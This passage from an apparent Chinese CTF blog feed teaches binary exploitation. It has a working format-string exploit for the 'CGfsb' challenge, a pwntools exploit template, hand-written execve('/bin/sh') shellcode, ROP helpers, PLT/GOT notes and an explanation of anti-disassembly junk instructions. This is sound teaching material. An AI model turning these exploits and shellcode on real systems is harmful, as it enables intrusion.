参数把他前面输出的字符数赋值给了变量 <code>c</code></strong>，因此，只要更改 <code>c</code> 所对应栈中的地址就可以把我们想要的数值赋给对应地址</p></blockquote><hr><h3 id="printf栈结构"><a href="#printf栈结构" class="headerlink" title="printf栈结构"></a>printf栈结构</h3><p><img src="https://s2.loli.net/2023/03/17/Gb6ugVmROpPU1or.png" alt="CTF - Pwn_格式化字符串漏洞2.png"></p><ul><li>我们把先前输出字符的总长度赋值给了 参数4 所对应的地址，也就是说，我们只要控制前面输出的长度就可以控制该参数所对应地址的值了</li><li>要想控制 参数4 的值，就要用到 <code>printf</code> 的另外一个特性：<code>$</code> 操作符。这个操作符可以输出指定位置的参数</li><li>假如格式化输出参数是 <code>%6$n</code> 的话，就把之前输出的长度赋值给 <code>printf</code> 函数的 第6个 参数，但是 <code>printf</code> 函数根本不知道自己的栈有多大，所以我们只需要把这个偏移数值定位到我们能够修改的内存空间<ol><li>例如，把这个偏移数值定位到题目中的 v8 变量所在地址</li><li>获取偏移量，通过查看前面构造的偷看任意位置内存空间的输入运行结果：<br><code>AAAA 0xffffd13e 0xf7fae580 0xffffd19c 0xf7ffdae0 0x1 0xf7fcb410 0x61610001 0xa6161 (nil) 0x41414141 0x25207025 0x70252070 0x20702520 0x20207025 0x20207025 0x20207025 0x20207025 0x20207025 0x20207025</code></li><li>看到 <code>&#39;0x41414141&#39;</code>，就是我们输入的 <code>AAAA</code>，也就是说，我们能控制的内存空间相对位置在 <code>printf</code> 函数的 第10个 参数位置<ul><li>其实 <code>printf</code> 函数根本没有这么多个参数，只不过他自己并不知道；从 <code>AAAA</code> 到 <code>0x41414141</code> 还有 九个 输出值，所以 <code>v8</code> 在相对 第10个 参数位置</li></ul></li></ol></li></ul><hr><ul><li><h3 id="构造-exp"><a href="#构造-exp" class="headerlink" title="构造 exp"></a>构造 exp</h3></li></ul><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>r <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./CGfsb"</span><span class="token punctuation">)</span>pwnme_addr <span class="token operator">=</span> <span class="token number">0x0804A068</span> <span class="token comment">#pwnme地址在伪代码中双击查看</span>payload <span class="token operator">=</span> p32<span class="token punctuation">(</span>pwnme_addr<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'aaaa'</span> <span class="token operator">+</span> <span class="token string">'%10\$n'</span> <span class="token comment">#pwnme的地址需要经过32位编码转换，是四位，而pwnme需要等于8，所以‘aaaa’起着凑字数的作用</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"please tell me your name:\n"</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'aaaa'</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"leave your message please:\n"</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;格式化字符串漏洞&quot;&gt;&lt;a href=&quot;#格式化字符串漏洞&quot; class=&quot;headerlink&quot; title=&quot;格式化字符串漏洞&quot;&gt;&lt;/a&gt;格式化字符串漏洞&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;格式化字符串漏洞，是由编程时使用 &lt;code&gt;printf&lt;/co</summary>
      
    
    
    
    <category term="二进制漏洞利用" scheme="https://4ss1du0us.github.io/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
    
    
    <category term="PWN" scheme="https://4ss1du0us.github.io/tags/PWN/"/>
    
  </entry>
  
  <entry>
    <title>Pwntools</title>
    <link href="https://4ss1du0us.github.io/2023/03/19/CTF%20-%20Pwn/Pwntools/"/>
    <id>https://4ss1du0us.github.io/2023/03/19/CTF%20-%20Pwn/Pwntools/</id>
    <published>2023-03-19T07:39:30.000Z</published>
    <updated>2023-03-19T07:51:16.956Z</updated>
    
    <content type="html"><![CDATA[<h2 id="相关术语"><a href="#相关术语" class="headerlink" title="相关术语"></a>相关术语</h2><ul><li><strong>exploit（简称exp）</strong>：用于攻击的脚本与方案</li><li><strong>payload</strong>：攻击载荷，是对目标进程劫持控制流的数据</li><li><strong>shellcode</strong>：调用攻击目标的 shell 的代码</li></ul><hr><h2 id="32位-和-64位-的差异"><a href="#32位-和-64位-的差异" class="headerlink" title="32位 和 64位 的差异"></a>32位 和 64位 的差异</h2><ul><li><strong>在写 exp、payload 的时候</strong></li></ul><div class="table-container"><table><thead><tr><th>位数</th><th>写法差异</th></tr></thead><tbody><tr><td>32位</td><td><code>p32(system) + p32(bin_sh)</code></td></tr><tr><td>64位</td><td><code>p64(rdi) + p64(bin_sh) + p64(system)</code></td></tr></tbody></table></div><ul><li>出现栈劫持的时候 <code>p(bin_sh)</code> 在前面</li></ul><hr><h2 id="Pwn程序输入脚本样例（exp-py）"><a href="#Pwn程序输入脚本样例（exp-py）" class="headerlink" title="Pwn程序输入脚本样例（exp.py）"></a>Pwn程序输入脚本样例（exp.py）</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>  <span class="token comment"># 打印调试信息</span>content <span class="token operator">=</span> <span class="token number">0</span>  <span class="token comment"># 本地Pwn通之后，将content改成0，Pwn远程端口</span><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> content <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>        io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./when"</span><span class="token punctuation">)</span>  <span class="token comment"># 程序在kali的路径</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"220.249.52.133"</span><span class="token punctuation">,</span> <span class="token number">37645</span><span class="token punctuation">)</span>  <span class="token comment"># 题目的远程端口，注意是remote</span>    payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x20</span> <span class="token operator">-</span> <span class="token number">0x18</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">1926</span><span class="token punctuation">)</span>  <span class="token comment"># 需要上传的输入内容，(0x20 - 0x18 + 8)根据栈地址确定需要输入的数据位数</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"What's Your Birth?\n"</span><span class="token punctuation">)</span>  <span class="token comment"># 程序的输出信息</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"999"</span><span class="token punctuation">)</span>  <span class="token comment"># 给程序发送输入内容</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"What's Your Name?\n"</span><span class="token punctuation">)</span>  <span class="token comment"># 程序的输出信息</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>  <span class="token comment"># 给程序发送payload作为输入内容</span>    io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment"># 接收回显</span>main<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><strong>如果 exp.py 可以 PWN 通，在远程只会显示 <code>[*] Switching to interactive mode</code>，而没有 <code>[*] Got EOF while reading in interactive</code></strong></li></ul><hr><h2 id="exp-脚本直接获取-elf-文件中某个已知函数名的函数地址"><a href="#exp-脚本直接获取-elf-文件中某个已知函数名的函数地址" class="headerlink" title="exp 脚本直接获取 elf 文件中某个已知函数名的函数地址"></a>exp 脚本直接获取 elf 文件中某个已知函数名的函数地址</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python">elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./test"</span><span class="token punctuation">)</span>   <span class="token comment"># 程序路径</span>system_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"callsystem"</span><span class="token punctuation">]</span>   <span class="token comment"># system_addr为程序test中函数"callsystem"的地址</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><hr><h2 id="exp-脚本获取某一行的输出信息，并将其转换为-16进制-数据"><a href="#exp-脚本获取某一行的输出信息，并将其转换为-16进制-数据" class="headerlink" title="exp 脚本获取某一行的输出信息，并将其转换为 16进制 数据"></a>exp 脚本获取某一行的输出信息，并将其转换为 16进制 数据</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python">io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'But there is gift for you :\n'</span><span class="token punctuation">)</span>   <span class="token comment"># 屏幕输出信息</span>main_addr <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>caiji<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>   <span class="token comment"># 接收直到 \n 为止的输出数据，并将其转换为16进制 int 型，最后赋值main_addr</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ul><li><strong>若地址随机，即：每次输出到屏幕的信息不一样，则不能采取直接赋值，只能使用此方法</strong></li></ul><hr><h2 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h2><ul><li><p>当我们在获得程序的漏洞后，就可以在程序的漏洞处执行特定的代码，而这些能够获取到 shell 的 code 就是 shellcode</p></li><li><p>在漏洞利用过程时，我们将精心编制好的 shellcode 通过有问题的程序写入到内存中，然后执行</p></li><li><p>该 shellcode 对应的C语言代码一般为：<code>system(&quot;/bin/sh&quot;)</code></p></li></ul><hr><h3 id="Pwntools-生成默认-shellcode"><a href="#Pwntools-生成默认-shellcode" class="headerlink" title="Pwntools 生成默认 shellcode"></a>Pwntools 生成默认 shellcode</h3><p>方法一：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">shellcode <span class="token operator">=</span> asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span>sh<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment"># 构造shellcode</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>方法二：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">shellcode <span class="token operator">=</span> asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span>amd64<span class="token punctuation">.</span>linux<span class="token punctuation">.</span>sh<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment"># 构造shellcode</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li><strong>这段代码有一个缺点，就是生成的 shellcode 比较长，在某些空间比较小的情况不能很好的使用</strong></li></ul><h3 id="手动编写-shellcode"><a href="#手动编写-shellcode" class="headerlink" title="手动编写 shellcode"></a>手动编写 shellcode</h3><ul><li><h4 id="shellcode-这一段代码调动-shell-的原理："><a href="#shellcode-这一段代码调动-shell-的原理：" class="headerlink" title="shellcode 这一段代码调动 shell 的原理："></a>shellcode 这一段代码调动 shell 的原理：</h4><ol><li>linux 中，存在着一系列的系统调用，这些系统调用都通过 <code>syscall</code> 指令来触发，并且通过 rax 寄存器作为系统调用号来区分不同的系统调用，可以通过查看 linux 源码目录下的 <code>arch/x86/entry/syscall_64.tbl</code> 获得对应的系统调用号。比如，<code>execve</code>（执行程序函数，类似于 Python 中的<code>os.system</code> 函数，可以调用其他程序的执行）对应的的系统调用号为 59</li><li>接着，通过 rdi 和 rsi 两个寄存器传入参数。其中，rdi 是指向运行程序的路径的指针，rsi 为一个指向 0 的指针，rdx 为 0</li></ol></li></ul><p>即，应该完成：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">rax <span class="token operator">=</span> <span class="token number">59</span>rdi <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token char">'/bin/sh'</span><span class="token punctuation">]</span>rsi <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>rdx <span class="token operator">=</span> <span class="token number">0</span>syscall<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>对应的汇编代码：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">xor rdx<span class="token punctuation">,</span>rdxpush rdxmov rsi<span class="token punctuation">,</span>rspmov rax<span class="token punctuation">,</span><span class="token number">0x68732f2f6e69622f</span>push raxmov rdi<span class="token punctuation">,</span>rspmov rax<span class="token punctuation">,</span><span class="token number">59</span>syscall<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><h4 id="利用Pwntools编译使用："><a href="#利用Pwntools编译使用：" class="headerlink" title="利用Pwntools编译使用："></a>利用Pwntools编译使用：</h4></li></ul><pre class="line-numbers language-python" data-language="python"><code class="language-python"> <span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>arch <span class="token operator">=</span> <span class="token string">'amd64'</span>shellcode <span class="token operator">=</span> <span class="token triple-quoted-string string">'''xor rdx,rdx;push rdx;mov rsi,rsp;mov rax,0x68732f2f6e69622f;push rax;mov rdi,rsp;mov rax,59;syscall;'''</span>shellcode <span class="token operator">=</span> asm<span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span> \# 这里因为<span class="token number">64</span>位数据不能直接push，所以用了rax寄存器来传递<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><strong>这样生成的 shellcode 就只有30字节，一般这种大小就足够了</strong></li></ul><hr><h2 id="Pwntools语句"><a href="#Pwntools语句" class="headerlink" title="Pwntools语句"></a>Pwntools语句</h2><h3 id="连接"><a href="#连接" class="headerlink" title="连接"></a>连接</h3><div class="table-container"><table><thead><tr><th>语句</th><th>意义</th></tr></thead><tbody><tr><td>io = porcess(“./&lt;文件名&gt;”)</td><td>本地连接</td></tr><tr><td>io = remote(“ip地址”, 端口)</td><td>远程连接</td></tr><tr><td>io.close()</td><td>关闭连接</td></tr></tbody></table></div><hr><h3 id="发送-payload"><a href="#发送-payload" class="headerlink" title="发送 payload"></a>发送 payload</h3><div class="table-container"><table><thead><tr><th>语句</th><th>意义</th></tr></thead><tbody><tr><td>io.sendafter(some_string, payload)</td><td>接收到 some_string 后，发送你的 payload</td></tr><tr><td>io.sendlineafter(some_string, payload)</td><td>接收到 some_string 后，发送你的 payload，并进行换行（末尾\n）</td></tr><tr><td>io.send(payload)</td><td>发送 payload</td></tr><tr><td>io.sendline(payload)</td><td>发送 payload，并进行换行（末尾\n）</td></tr></tbody></table></div><hr><h3 id="接收返回内容"><a href="#接收返回内容" class="headerlink" title="接收返回内容"></a>接收返回内容</h3><div class="table-container"><table><thead><tr><th>语句</th><th>意义</th></tr></thead><tbody><tr><td>io.interactive()</td><td>直接进行交互，相当于回到 shell 的模式，一般在取得 shell 之后使用</td></tr></tbody></table></div><div class="table-container"><table><thead><tr><th>语句</th><th>意义</th></tr></thead><tbody><tr><td>asm(shellcraft.sh())</td><td>生成 Pwntools 默认 shellcode</td></tr><tr><td>shellcode = asm(shellcode)</td><td>生成自己编写的 shellcode</td></tr></tbody></table></div><div class="table-container"><table><thead><tr><th>语句</th><th>意义</th></tr></thead><tbody><tr><td>io.recv(N)</td><td>接收 N 个字符</td></tr><tr><td>io.recvline()</td><td>接收一行输出</td></tr><tr><td>io.recvlines(N)</td><td>接收 N 个行输出</td></tr><tr><td>io.recvuntil(some_string)</td><td>接收到 some_string 为止</td></tr></tbody></table></div><div class="table-container"><table><thead><tr><th>语句</th><th>意义</th></tr></thead><tbody><tr><td>stack=int(io.recv(10),16)</td><td>接收回显的参数在栈上的地址，长度是10，以16进制表示</td></tr></tbody></table></div><hr><h3 id="ELF"><a href="#ELF" class="headerlink" title="ELF"></a>ELF</h3><p><strong>首先需要 <code>elf = ELF(&quot;./&lt;文件名&gt;&quot;)</code> 来产生一个对象</strong></p><div class="table-container"><table><thead><tr><th>语句</th><th>意义</th></tr></thead><tbody><tr><td>elf.symbols[“a_function”]</td><td>找到 a_function 的地址</td></tr><tr><td>elf.got[“a_function”]</td><td>找到 a_function 的 got</td></tr><tr><td>elf.plt[“a_function”]</td><td>找到 a_function 的 plt</td></tr><tr><td>next(elf.search(“some_characters”))</td><td>找到包含 some_characters 的内容，可以是字符串、汇编代码或某个数值的地址</td></tr></tbody></table></div><hr><h3 id="ROP"><a href="#ROP" class="headerlink" title="ROP"></a>ROP</h3><p><strong>首先需要 <code>rop = ROP(&quot;./&lt;文件名&gt;&quot;)</code> 创建一个对象</strong></p><div class="table-container"><table><thead><tr><th>语句</th><th>意义</th></tr></thead><tbody><tr><td>rop.raw(‘a’ * 32)</td><td>在构造的 rop 链里面写32个 a</td></tr><tr><td>rop.call(‘read’ , (0 , elf.bss(0x80)))</td><td>调用一个函数，可以简写成：<code>rop.read(0,elf.bss(0x80))</code></td></tr><tr><td>rop.chain()</td><td>就是整个 rop 链，发送的 payload</td></tr><tr><td>rop.dump()</td><td>直观地展示当前的 rop 链</td></tr><tr><td>rop.migrate(base_stage)</td><td>将程序流程转移到 base_stage（地址）</td></tr><tr><td>rop.unresolve(value)</td><td>给出一个地址，反解析出符号</td></tr><tr><td>rop.search(regs=[‘ecx’ , ‘ebx’])</td><td>搜索对 eax 进行操作的 gadgets</td></tr><tr><td>rop.find_gadget([‘pop eax’ , ‘ret’])</td><td>搜索 <code>pop eax ret</code> 这样的 gadgets</td></tr></tbody></table></div>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;相关术语&quot;&gt;&lt;a href=&quot;#相关术语&quot; class=&quot;headerlink&quot; title=&quot;相关术语&quot;&gt;&lt;/a&gt;相关术语&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;exploit（简称exp）&lt;/strong&gt;：用于攻击的脚本与方案&lt;/li&gt;
&lt;li&gt;&lt;str</summary>
      
    
    
    
    <category term="二进制漏洞利用" scheme="https://4ss1du0us.github.io/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
    
    
    <category term="PWN" scheme="https://4ss1du0us.github.io/tags/PWN/"/>
    
  </entry>
  
  <entry>
    <title>PLT表和GOT表</title>
    <link href="https://4ss1du0us.github.io/2023/03/19/CTF%20-%20Pwn/PLT%E8%A1%A8%E5%92%8CGOT%E8%A1%A8/"/>
    <id>https://4ss1du0us.github.io/2023/03/19/CTF%20-%20Pwn/PLT%E8%A1%A8%E5%92%8CGOT%E8%A1%A8/</id>
    <published>2023-03-19T07:39:19.000Z</published>
    <updated>2023-03-19T07:50:11.635Z</updated>
    
    <content type="html"><![CDATA[<h2 id="PLT表和GOT表"><a href="#PLT表和GOT表" class="headerlink" title="PLT表和GOT表"></a>PLT表和GOT表</h2><blockquote><p>为了更好的用户体验和内存、CPU的利用率，程序编译时会采用两种表进行辅助，一个为 PLT表，一个为 GOT表</p></blockquote><hr><h3 id="PLT表-称为-内部函数表，GOT表-称为-全局函数表-动态函数表"><a href="#PLT表-称为-内部函数表，GOT表-称为-全局函数表-动态函数表" class="headerlink" title="PLT表 称为 内部函数表，GOT表 称为 全局函数表(动态函数表)"></a>PLT表 称为 <mark>内部函数表</mark>，GOT表 称为 <mark>全局函数表</mark>(动态函数表)</h3><ul><li>这两个表是相对应的，PLT表中的数据就是 GOT表中的一个地址，可以理解为一定是一一对应的：<br><img src="https://s2.loli.net/2023/03/17/8sbdGo4LcXJAh7r.png" alt="CTF - Pwn_PLT表 &amp; GOT表1.png"></li></ul><hr><h3 id="PLT表其实是一个过渡的作用，PLT表中只存放-GOT表项的地址，而不是函数真实的地址，函数真实的地址存放在GOT表中"><a href="#PLT表其实是一个过渡的作用，PLT表中只存放-GOT表项的地址，而不是函数真实的地址，函数真实的地址存放在GOT表中" class="headerlink" title="PLT表其实是一个过渡的作用，PLT表中只存放 GOT表项的地址，而不是函数真实的地址，函数真实的地址存放在GOT表中"></a>PLT表其实是一个过渡的作用，PLT表中只存放 GOT表项的地址，而不是函数真实的地址，函数真实的地址存放在GOT表中</h3><ul><li><strong>当 <code>main()</code> 函数开始，会请求 PLT表 中这个函数对应的 GOT表 地址，若是第一次调用：</strong><pre><code>1. 由函数调用跳入到 PLT表 中2. PLT表 跳到 GOT表 中3. 由 GOT表 回跳到 PLT表 中，这时候进行压栈，把代表函数的 ID 压栈4. 接着跳转到公共的 PLT表 项中5. 进入到 GOT表6. 然后 `_dl_runtime_resolve` 对动态函数进行地址解析和重定位7. 把动态函数真实的地址写入到GOT表项中，然后执行函数并返回</code></pre></li><li><strong>若是第二次调用</strong><pre><code>1. 由函数调用跳入到 PLT表 中2. PLT表 跳入到 GOT表 中，由于这个时候该表项已经是动态函数的真实地址了，所以可以直接执行然后返回，例如：call scanf —&gt; scanf的 plt表 —&gt;scanf的 got表</code></pre><img src="https://s2.loli.net/2023/03/17/SXbfnRoJVKGpej2.png" alt="CTF - Pwn_PLT表 &amp; GOT表2.png"><pre><code>4. 当进入带有 @plt 标志的函数时，由函数调用跳入到PLT表中5. 在 PLT表中找到对应的函数的 GOT表项地6. 通过 jmp 指令跳转到 GOT表，得到函数的真实地址7. 跳转到真实函数地址执行</code></pre></li></ul><hr><ul><li>例如，在汇编代码中<br><img src="https://s2.loli.net/2023/03/17/BpfS9JQukl6qrzd.png" alt="CTF - Pwn_PLT表 &amp; GOT表3.png"></li><li><code>call _printf</code> 并不是跳转到了实际的 <code>_printf</code> 函数的位置。 因为在编译时程序并不能确定 <code>printf</code> 函数的地址， 所以这个 <code>call</code> 指令实际上是通过相对跳转， 跳转到了 PLT表 中的 <code>_printf</code> 项，然后再根据 PLT表 中的地址跳转到 GOT表，才能获取到实际的 <code>_printf</code> 函数地址，进而执行 <code>printf</code> 函数</li></ul><div class="table-container"><table><thead><tr><th style="text-align:left">段名</th><th style="text-align:left">作用</th></tr></thead><tbody><tr><td style="text-align:left">.got</td><td style="text-align:left">GOT（Global Offset Table）全局偏移表。这是「链接器」为「外部符号」填充的实际偏移表</td></tr><tr><td style="text-align:left">.plt</td><td style="text-align:left">PLT（Procedure Linkage Table）程序链接表。它有两个功能，要么在 <code>.got.plt</code> 节中拿到地址，并跳转。要么当 <code>.got.plt</code> 没有所需地址的时，触发「链接器」去找到所需地址</td></tr><tr><td style="text-align:left">.got.plt</td><td style="text-align:left">这个是 GOT 专门为 PLT 专门准备的节。说白了，<strong>.got.plt 中的值是 GOT 的一部分</strong>。它包含上述 PLT 表所需地址（已经找到的和需要去触发的）</td></tr><tr><td style="text-align:left">.plt.got</td></tr></tbody></table></div>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;PLT表和GOT表&quot;&gt;&lt;a href=&quot;#PLT表和GOT表&quot; class=&quot;headerlink&quot; title=&quot;PLT表和GOT表&quot;&gt;&lt;/a&gt;PLT表和GOT表&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;为了更好的用户体验和内存、CPU的利用率，程序编译时会采用</summary>
      
    
    
    
    <category term="二进制漏洞利用" scheme="https://4ss1du0us.github.io/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
    
    
    <category term="PWN" scheme="https://4ss1du0us.github.io/tags/PWN/"/>
    
  </entry>
  
  <entry>
    <title>将函数加密为数组动态执行</title>
    <link href="https://4ss1du0us.github.io/2023/03/19/CTF%20-%20Reverse/%E5%B0%86%E5%87%BD%E6%95%B0%E5%8A%A0%E5%AF%86%E4%B8%BA%E6%95%B0%E7%BB%84%E5%8A%A8%E6%80%81%E6%89%A7%E8%A1%8C/"/>
    <id>https://4ss1du0us.github.io/2023/03/19/CTF%20-%20Reverse/%E5%B0%86%E5%87%BD%E6%95%B0%E5%8A%A0%E5%AF%86%E4%B8%BA%E6%95%B0%E7%BB%84%E5%8A%A8%E6%80%81%E6%89%A7%E8%A1%8C/</id>
    <published>2023-03-19T07:23:24.000Z</published>
    <updated>2023-03-19T07:31:57.971Z</updated>
    
    
    
    
    <category term="逆向" scheme="https://4ss1du0us.github.io/categories/%E9%80%86%E5%90%91/"/>
    
    
    <category term="REVERSE" scheme="https://4ss1du0us.github.io/tags/REVERSE/"/>
    
  </entry>
  
  <entry>
    <title>花指令</title>
    <link href="https://4ss1du0us.github.io/2023/03/19/CTF%20-%20Reverse/%E8%8A%B1%E6%8C%87%E4%BB%A4/"/>
    <id>https://4ss1du0us.github.io/2023/03/19/CTF%20-%20Reverse/%E8%8A%B1%E6%8C%87%E4%BB%A4/</id>
    <published>2023-03-19T07:23:13.000Z</published>
    <updated>2023-03-19T07:31:22.142Z</updated>
    
    <content type="html"><![CDATA[<h2 id="花指令（代码与数据混合）"><a href="#花指令（代码与数据混合）" class="headerlink" title="花指令（代码与数据混合）"></a>花指令（代码与数据混合）</h2><blockquote><p>花指令实质就是一串垃圾指令，它与程序本身的功能无关，并不影响程序本身的逻辑</p><p>在软件保护中，花指令被作为一种手段来增加静态分析的难度，花指令也可以被用在病毒或木马上，通过加入花指令改变程序的特征码，躲避杀软的扫描，从而达到免杀的目的</p><p><strong><em>花指令是对抗反汇编的有效手段之一。目的是干扰 IDA 和 OD 等软件对程序的静态分析，使这些软件无法正常反汇编出原始代码</em></strong></p><p><strong>花指令分为两类：可执行的花指令、不可执行的花指令</strong></p></blockquote><hr><h3 id="常用的两类反汇编算法"><a href="#常用的两类反汇编算法" class="headerlink" title="常用的两类反汇编算法"></a>常用的两类反汇编算法</h3><ol><li><p><mark>线性扫描算法</mark> —— <em>逐行反汇编（无法将数据和内容进行区分）</em></p><ul><li><u>将遇到的每一条指令都解析成汇编指令</u>。没有对反汇编的内容进行判断，因而无法正确区分代码和数据，一些数据也会被当成代码来解码，从而导致反汇编出现错误，这种错误将会影响对下一条指令的正确识别</li><li>例如：简单的花指令 <code>0xE8</code> 是跳转指令，可以对线性扫描算法进行干扰，但是递归扫描算法可以正常分析<br><img src="https://s2.loli.net/2023/03/17/PK2fIRkFxwsCUJS.png" alt="CTF - Reverse_花指令1.png"></li></ul></li><li><p><mark>递归行进算法</mark> —— <em>按照代码可能的执行顺序进行反汇编程序</em></p><ul><li><u>按照代码可能的执行顺序来反汇编程序</u>。对每条可能的路径进行扫描，当解码出分支指令后，反汇编工具就将这个分支指令的地址记录下来，并分别反汇编各个分支中的指令，这种算法比较灵活，可以避免将代码中的数据作为指令来解码</li><li>例如：两个跳转一个指向无效数据，一个指向正常数据来干扰递归扫描算法<br><img src="https://s2.loli.net/2023/03/17/Eq8kMvyJNIX7H5e.png" alt="CTF - Reverse_花指令2.png"></li></ul></li></ol><hr><h3 id="一般的花指令"><a href="#一般的花指令" class="headerlink" title="一般的花指令"></a>一般的花指令</h3><p><img src="https://s2.loli.net/2023/03/17/hKwl3Sd5Mmv6ojt.png" alt="CTF - Reverse_花指令3.png"></p><hr><h3 id="可执行的花指令"><a href="#可执行的花指令" class="headerlink" title="可执行的花指令"></a>可执行的花指令</h3><blockquote><p>能够正常运行但又不改变原始程序逻辑性的一组无用指令，它们运行完后不会改变原来程序的堆栈、寄存器，但能起到干扰静态分析的作用</p><p>这类花指令有如下特点：</p><ol><li>可以正常运行</li><li>不改变任何寄存器的值</li><li>反汇编器可以正确反汇编该指令</li></ol><p>一般分两种：</p><ol><li>改变堆栈操作</li><li>利用 <strong>call 指令</strong>或 <strong>jmp 指令</strong>增加执行流程的复杂度【call 指令的硬指令为 0E8h，<mark>E8 表示执行，90 表示跳过</mark>】</li></ol></blockquote><ul><li><strong>示例：</strong></li></ul><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>_asm <span class="token punctuation">&#123;</span>push eax<span class="token punctuation">;</span>add esp<span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Hello World!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在 32位 下，<code>push eax</code> 分为两个步骤：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token punctuation">(</span>esp<span class="token punctuation">)</span> <span class="token operator">&lt;</span><span class="token operator">--</span> <span class="token punctuation">(</span>esp<span class="token 